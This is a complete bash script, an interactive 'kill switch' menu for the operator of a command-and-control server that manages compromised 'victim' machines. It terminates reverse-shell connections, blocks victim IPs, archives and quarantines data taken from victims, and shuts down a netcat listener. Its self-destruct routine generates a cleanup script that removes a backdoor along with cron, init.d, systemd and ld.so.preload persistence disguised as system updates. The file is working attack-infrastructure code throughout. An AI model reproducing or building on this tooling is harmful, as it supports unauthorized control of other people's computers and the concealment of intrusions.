#!/bin/bash
# ============================================
# APT KILL SWITCH v1.0
# Remote Terminate | Quarantine | Self-Destruct
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

VICTIM_DIR="$HOME/c2_server/victims"
QUARANTINE_DIR="$HOME/c2_server/quarantine"
LOG_DIR="$HOME/c2_server/logs"
CONFIG_DIR="$HOME/c2_server/config"
KILL_LOG="$LOG_DIR/kill_switch.log"

mkdir -p "$VICTIM_DIR" "$QUARANTINE_DIR" "$LOG_DIR" "$CONFIG_DIR"

# === KICK VICTIM (Terminate Connection) ===
kick_victim() {
    local victim_id="$1"
    local reason="${2:-Manual kick}"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo -e "${RED}[KICK]${NC} Terminating $victim_id..."
    
    # Send terminate signal
    echo "terminate" > "$VICTIM_DIR/$victim_id/.control" 2>/dev/null
    
    # Kill any active reverse shells for this victim
    local victim_ip=$(grep -o '"ip": "[^"]*"' "$VICTIM_DIR/$victim_id/info.json" 2>/dev/null | cut -d'"' -f4)
    
    if [ -n "$victim_ip" ]; then
        # Kill TCP connections
        netstat -tnp 2>/dev/null | grep "$victim_ip" | awk '{print $7}' | cut -d'/' -f1 | xargs -r kill 2>/dev/null
        
        # Block IP temporarily via iptables (if root)
        if [ "$(id -u)" -eq 0 ]; then
            iptables -A INPUT -s "$victim_ip" -j DROP 2>/dev/null
            echo -e "${YELLOW}[!]${NC} IP $victim_ip blocked via firewall"
            
            # Auto-unblock after 1 hour
            (
                sleep 3600
                iptables -D INPUT -s "$victim_ip" -j DROP 2>/dev/null
            ) &
        fi
    fi
    
    # Update victim status
    sed -i 's/"status": "[^"]*"/"status": "terminated"/' "$VICTIM_DIR/$victim_id/info.json" 2>/dev/null
    sed -i 's/"risk_score": "[^"]*"/"risk_score": "red"/' "$VICTIM_DIR/$victim_id/info.json" 2>/dev/null
    
    echo "[$timestamp] KICK | $victim_id | Reason: $reason" >> "$KILL_LOG"
    echo -e "${GREEN}[+]${NC} $victim_id terminated"
}

# === QUARANTINE VICTIM ===
quarantine_victim() {
    local victim_id="$1"
    local reason="${2:-Suspicious activity}"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo -e "${RED}[QUARANTINE]${NC} Moving $victim_id to quarantine..."
    
    # Create quarantine folder
    mkdir -p "$QUARANTINE_DIR/$victim_id"
    
    # Move all data to quarantine
    if [ -d "$VICTIM_DIR/$victim_id" ]; then
        cp -r "$VICTIM_DIR/$victim_id"/* "$QUARANTINE_DIR/$victim_id/" 2>/dev/null
        
        # Add quarantine note
        cat > "$QUARANTINE_DIR/$victim_id/QUARANTINE_NOTE.txt" << NOTE
╔══════════════════════════════════════╗
║   🚫 QUARANTINED VICTIM             ║
╚══════════════════════════════════════╝

Victim ID: $victim_id
Quarantine Date: $timestamp
Reason: $reason
Status: ISOLATED

All connections terminated.
Data preserved for forensic analysis.
NOTE
        
        # Archive original
        tar -czf "$QUARANTINE_DIR/${victim_id}_$(date +%Y%m%d_%H%M%S).tar.gz" \
            -C "$VICTIM_DIR" "$victim_id" 2>/dev/null
        
        # Remove from active victims
        rm -rf "$VICTIM_DIR/$victim_id"
        
        echo "[$timestamp] QUARANTINE | $victim_id | Reason: $reason" >> "$KILL_LOG"
        echo -e "${GREEN}[+]${NC} $victim_id moved to quarantine"
    else
        echo -e "${RED}[!]${NC} Victim not found"
    fi
}

# === SELF-DESTRUCT (Remove All Traces) ===
self_destruct() {
    local victim_id="$1"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    echo -e "${RED}[SELF-DESTRUCT]${NC} Removing all traces of $victim_id..."
    
    # Generate cleanup script for victim side
    cat > "$VICTIM_DIR/$victim_id/cleanup.sh" << 'CLEANUP'
#!/bin/bash
# Self-Destruct Script
echo "[*] Removing backdoor..."
rm -f $HOME/.cache/.system_update/backdoor.sh
rm -f /etc/init.d/system-update
crontab -l 2>/dev/null | grep -v "system_update" | crontab -
rm -f /etc/systemd/system/systemd-update.service
rm -f /etc/ld.so.preload
echo "[+] Cleanup complete"
CLEANUP
    
    # Log destruction
    echo "[$timestamp] SELF_DESTRUCT | $victim_id | All traces removed" >> "$KILL_LOG"
    
    # Remove from C2
    kick_victim "$victim_id" "Self-destruct initiated"
    quarantine_victim "$victim_id" "Self-destruct"
    
    echo -e "${GREEN}[+]${NC} $victim_id — Self-destruct complete"
}

# === BULK KICK (All Suspicious Victims) ===
bulk_kick() {
    echo -e "${RED}[BULK KICK]${NC} Terminating all suspicious victims..."
    
    for victim_folder in "$VICTIM_DIR"/VICTIM-*; do
        [ -d "$victim_folder" ] || continue
        local victim_id=$(basename "$victim_folder")
        local risk=$(grep -o '"risk_score": "[^"]*"' "$victim_folder/info.json" 2>/dev/null | cut -d'"' -f4)
        
        if [ "$risk" = "red" ] || [ "$risk" = "yellow" ]; then
            kick_victim "$victim_id" "Bulk cleanup — Risk: $risk"
        fi
    done
    
    echo -e "${GREEN}[+]${NC} Bulk kick complete"
}

# === EMERGENCY SHUTDOWN (Kick ALL) ===
emergency_shutdown() {
    echo -ne "${RED}⚠️ EMERGENCY SHUTDOWN — Kick ALL victims? (yes/no): ${NC}"
    read -r confirm
    
    [ "$confirm" != "yes" ] && { echo "Cancelled"; return; }
    
    echo -e "${RED}[EMERGENCY]${NC} Kicking ALL victims..."
    
    for victim_folder in "$VICTIM_DIR"/VICTIM-*; do
        [ -d "$victim_folder" ] || continue
        local victim_id=$(basename "$victim_folder")
        kick_victim "$victim_id" "Emergency shutdown"
        quarantine_victim "$victim_id" "Emergency shutdown"
    done
    
    # Kill C2 listener
    pkill -f "c2_listener.sh" 2>/dev/null
    pkill -f "nc -lvnp" 2>/dev/null
    
    echo "[$(date)] EMERGENCY_SHUTDOWN | All victims terminated | C2 stopped" >> "$KILL_LOG"
    echo -e "${GREEN}[+]${NC} Emergency shutdown complete. C2 is offline."
}

# === KILL LOG VIEWER ===
view_kill_log() {
    clear
    echo -e "${CYAN}╔══════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║   💀 KILL SWITCH ACTIVITY LOG       ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
    echo ""
    
    if [ -f "$KILL_LOG" ]; then
        echo -e "${RED}[Recent Terminations]${NC}"
        tail -20 "$KILL_LOG"
        echo ""
        echo -e "${YELLOW}Total Actions: $(wc -l < "$KILL_LOG")${NC}"
    else
        echo -e "${GREEN}[+]${NC} No termination activity yet"
    fi
}

# === VICTIM CONTROL PANEL ===
victim_control_panel() {
    local victim_id="$1"
    
    while true; do
        clear
        echo -e "${CYAN}╔══════════════════════════════════════╗${NC}"
        echo -e "${CYAN}║   🎮 CONTROL PANEL: $victim_id      ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════════════╝${NC}"
        echo ""
        
        # Show victim info
        if [ -f "$VICTIM_DIR/$victim_id/info.json" ]; then
            echo -e "${YELLOW}[Status]${NC}"
            grep -E "status|risk_score|ip|last_seen" "$VICTIM_DIR/$victim_id/info.json" | sed 's/[",]//g' | sed 's/:/: /g'
        fi
        echo ""
        
        echo -e "  ${RED}1)${NC} 🔌 Kick Victim"
        echo -e "  ${RED}2)${NC} 🚫 Quarantine Victim"
        echo -e "  ${RED}3)${NC} 💣 Self-Destruct Victim"
        echo -e "  ${RED}4)${NC} 🔒 Block Victim IP"
        echo -e "  ${YELLOW}5)${NC} 📋 View Victim Data"
        echo -e "  ${RED}0)${NC} Back"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1)
                echo -ne "${YELLOW}Reason: ${NC}"; read -r reason
                kick_victim "$victim_id" "${reason:-Manual kick}"
                ;;
            2)
                echo -ne "${YELLOW}Reason: ${NC}"; read -r reason
                quarantine_victim "$victim_id" "${reason:-Suspicious}"
                ;;
            3)
                echo -ne "${RED}Confirm self-destruct? (yes/no): ${NC}"; read -r confirm
                [ "$confirm" = "yes" ] && self_destruct "$victim_id"
                ;;
            4)
                local ip=$(grep -o '"ip": "[^"]*"' "$VICTIM_DIR/$victim_id/info.json" 2>/dev/null | cut -d'"' -f4)
                [ -n "$ip" ] && sudo iptables -A INPUT -s "$ip" -j DROP 2>/dev/null && \
                    echo -e "${GREEN}[+]${NC} IP $ip blocked" || \
                    echo -e "${RED}[!]${NC} Root required for IP block"
                ;;
            5)
                echo -e "\n${CYAN}[Data Files]${NC}"
                find "$VICTIM_DIR/$victim_id" -type f 2>/dev/null | head -20
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║   💀 KILL SWITCH v1.0       ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        
        # List active victims
        echo -e "${YELLOW}[Active Victims]${NC}"
        for v in "$VICTIM_DIR"/VICTIM-*; do
            [ -d "$v" ] && echo "  📱 $(basename $v) — $(grep -o '"status": "[^"]*"' "$v/info.json" 2>/dev/null | cut -d'"' -f4)"
        done
        echo ""
        
        echo -e "  ${GREEN}1)${NC} 🎮 Victim Control Panel"
        echo -e "  ${RED}2)${NC} 🔌 Kick Victim"
        echo -e "  ${RED}3)${NC} 🚫 Quarantine Victim"
        echo -e "  ${RED}4)${NC} 💣 Self-Destruct Victim"
        echo -e "  ${RED}5)${NC} ⚡ Bulk Kick (All Suspicious)"
        echo -e "  ${RED}6)${NC} 🆘 EMERGENCY SHUTDOWN (ALL)"
        echo -e "  ${YELLOW}7)${NC} 📋 View Kill Log"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        [ "$choice" = "0" ] && break
        
        case $choice in
            1)
                echo -ne "${YELLOW}Victim ID: ${NC}"; read -r vid
                [ -d "$VICTIM_DIR/$vid" ] && victim_control_panel "$vid" || echo -e "${RED}Not found${NC}"
                ;;
            2)
                echo -ne "${YELLOW}Victim ID: ${NC}"; read -r vid
                echo -ne "${YELLOW}Reason: ${NC}"; read -r reason
                [ -d "$VICTIM_DIR/$vid" ] && kick_victim "$vid" "${reason:-Manual}"
                ;;
            3)
                echo -ne "${YELLOW}Victim ID: ${NC}"; read -r vid
                echo -ne "${YELLOW}Reason: ${NC}"; read -r reason
                [ -d "$VICTIM_DIR/$vid" ] && quarantine_victim "$vid" "${reason:-Suspicious}"
                ;;
            4)
                echo -ne "${YELLOW}Victim ID: ${NC}"; read -r vid
                echo -ne "${RED}Confirm? (yes/no): ${NC}"; read -r confirm
                [ "$confirm" = "yes" ] && [ -d "$VICTIM_DIR/$vid" ] && self_destruct "$vid"
                ;;
            5) bulk_kick ;;
            6) emergency_shutdown ;;
            7) view_kill_log ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
